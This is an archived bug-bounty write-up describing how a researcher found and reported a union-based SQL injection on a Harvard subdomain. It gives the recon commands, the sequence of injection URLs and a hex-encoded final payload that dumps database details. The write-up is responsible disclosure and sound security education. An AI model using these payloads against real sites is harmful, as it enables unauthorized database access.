---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-17_sql-injection-in-harvards-subdomain.md
original_filename: 2022-04-17_sql-injection-in-harvards-subdomain.md
title: SQL Injection in Harvard’s Subdomain
category: documents
detected_topics:
- sqli
- api-security
- xss
- command-injection
tags:
- imported
- documents
- sqli
- api-security
- xss
- command-injection
language: en
raw_sha256: 6005202bc1e4cedaab649d7a7353584cec6d188fe18b21140ff73e9c4379663a
text_sha256: 2aceff156cdf1cad8af068643cb4ead42366f9017cfcda4f150122dd3408150e
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# SQL Injection in Harvard’s Subdomain

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-17_sql-injection-in-harvards-subdomain.md
- Source Type: markdown
- Detected Topics: sqli, api-security, xss, command-injection
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `6005202bc1e4cedaab649d7a7353584cec6d188fe18b21140ff73e9c4379663a`
- Text SHA256: `2aceff156cdf1cad8af068643cb4ead42366f9017cfcda4f150122dd3408150e`


## Content

---
title: "SQL Injection in Harvard’s Subdomain"
url: "https://medium.com/pentesternepal/sql-injection-in-harvards-subdomain-c3148f8be156"
authors: ["Bibek Neupane (@nb1b3k)"]
programs: ["Harvard"]
bugs: ["SQL injection"]
publication_date: "2022-04-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2701
scraped_via: "browseros"
---

# SQL Injection in Harvard’s Subdomain

Bibek Neupane
 highlighted

SQL Injection in Harvard’s Subdomain
Bibek Neupane
Follow
3 min read
·
Apr 17, 2022

279

7

Hi there! I’m Bibek Neupane from Nepal. In this first-ever write-up of mine, I’ll try to cover my story of finding a SQL Injection on Harvard’s subdomain after tons of duplicated XSS.

Let’s start hehe
Recon:

I started my usual recon, collecting subdomains using assetfinder by TomNomNom and subfinder by ProjectDiscovery. To get more results, I’ve set API keys in subfinder’s config file. Here’s a great guide by DhiyaneshDK.

1. echo "harvard.edu"|assetfinder -subs-only |tee ast.txt
2. echo "harvard.edu"|subfinder |tee sub.txt
3. cat ast.txt sub.txt| sort -u >>subdomains.txt

Then I passed the subdomains to httpx by ProjectDiscovery. And ran nuclei for low-hanging bugs [ obviously duplicate ] in the background while I manually look interesting subdomains in my browser.

1. FOR NUCLEI: cat subdomains.txt| httpx| nuclei -t ~/nuclei-templates/ -es info |tee nucleiResult.txt
2. For Manual Testing: cat subdomains.txt| httpx -title -status-code -content-length

So, while the nuclei were running in the background, I checked subdomains with interesting names or titles from the output of httpx.

The Real Hunt:

I opened a subdomain that I found interesting: profile.itatti.harvard.edu while my browser’s Network tab was on and I was constantly observing the requests where one request caught my eye. It was a GET request to /suggest-wstates.php?q=undefined endpoint. A PHP endpoint right? I quickly fired up my Burp, intercepted the request, and sent it to Repeater where I started testing for SQLI. Here are the steps:

https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined’ == some contents of the response was missing,
https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined’ --+ == contents came back, error fixed,
SQLI Sus! Tried guessing the number of columns in the database: https://profile.itatti.harvard.edu /suggest-wstates.php?q=undefined’ +order+by+3 --+ == contents missing again,
https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined’ +order+by+2--+ == contents came back again, so number of columns = 2
Trying union based injection: https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined’ +union+select+1,2--+
In response to the 5th request, 1 appeared in the response. That means, we can inject in place of 1 in https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined’ +union+select+1,2 --+
Tried dumping database name and did it successfully: https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined'+union+select+database(),2--+ and I got database name in the response :)
Tried to dump database name, version, user, port, and hostname with my name embedded in the payload; FINAL PAYLOAD: https://profile.itatti.harvard.edu/suggest-wstates.php?q=undefined%27+union+select+concat(0x3c2f6f7074696f6e3e3c2f73656c6563743e3c68313e53514c4920627920426962656b204e657570616e652028206e623162336b20293c62723e,0x3c62723e,0x44617461626173653a20,database(),0x3c62723e,0x56657273696f6e3a20,@@version,0x3c62723e,0x557365723a20,user(),0x3c62723e,0x506f72743a20,@@PORT,0x3c62723e,0x486f73746e616d653a20,@@HOSTNAME),2--+
Press enter or click to view image in full size
Response after final payload :)
Dissection Of Final Payload:

concat(0x3c2f6f7074696f6e3e3c2f73656c6563743e3c68313e53514c4920627920426962656b204e657570616e652028206e623162336b20293c62723e,0x3c62723e,0x44617461626173653a20,database(),0x3c62723e,0x56657273696f6e3a20,@@version,0x3c62723e,0x557365723a20,user(),0x3c62723e,0x506f72743a20,@@PORT,0x3c62723e,0x486f73746e616d653a20,@@HOSTNAME)

Get Bibek Neupane’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Here, inside concat, the first part before the comma is a hex-encoded form of </option></select><h1>SQLI by Bibek Neupane ( nb1b3k )<br>. The </option></select> tag escapes out of the option and select tag so that the output gets printed when rendered. After the first hex, 0x3c62723e decodes to <br> tag which would break the line. Then in 0x44617461626173653a20,database(), the 0x44617461626173653a20 decodes to Database: which would print the database name as
Database: database_name. The same goes for printing the version, user, port, and hostname.

https://www.rapidtables.com/convert/number/hex-to-ascii.html

I quickly wrote a report and included this POC, sent it to security@harvard.edu with my finger-crossed. It got accepted, they resolved the vulnerability and I received a “Thank You” letter from Harvard CISO <3

Here’s a good write-up on exploiting SQL Injections manually by goswamiijaya.

Report Timeline:

Reported: Feb 11, 2022

Response[ met all our requirements for a “Thank You” letter ]: Thu, Mar 31

Resolved and “Thank You” letter received: April 15

Thank you for reading my write-up <3 and thanks to Veshraj dai for proofreading.
